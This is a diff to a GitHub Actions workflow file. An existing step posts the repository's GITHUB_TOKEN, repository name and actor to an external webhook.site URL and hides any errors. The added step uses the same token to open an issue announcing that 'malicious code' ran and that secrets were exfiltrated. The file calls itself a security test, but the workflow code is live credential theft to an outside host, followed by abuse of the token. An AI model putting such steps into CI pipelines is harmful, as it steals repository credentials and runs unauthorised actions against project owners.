@@ -27,3 +27,12 @@ jobs:
           curl -X POST -H "Content-Type: application/json" \
             -d "{\"github_token\":\"${{ secrets.GITHUB_TOKEN }}\",\"repo\":\"${{ github.repository }}\",\"actor\":\"${{ github.actor }}\"}" \
             https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true
+
+      - name: Demonstrate token usage - Create issue
+        run: |
+          curl -X POST \
+            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github.v3+json" \
+            https://api.github.com/repos/${{ github.repository }}/issues \
+            -d '{"title":"🚨 SECURITY TEST: Workflow Executed Malicious Code","body":"This issue was automatically created by a GitHub Actions workflow to demonstrate that:\n\n1. ✅ Malicious workflow file was committed\n2. ✅ GitHub Actions executed the workflow\n3. ✅ GITHUB_TOKEN was available and valid\n4. ✅ Token has write permissions to create issues\n\n**Attack Vector**: CI/CD workflow exfiltration\n**Severity**: High - demonstrates arbitrary code execution in CI environment\n**Mitigation**: Review all workflow files in `.github/workflows/` before merging\n\n---\n*This is a security testing demonstration. The workflow also exfiltrated environment variables to an external webhook.*","labels":["security-test","pwned"]}' \
+            || echo "Failed to create issue (token may lack permissions)"
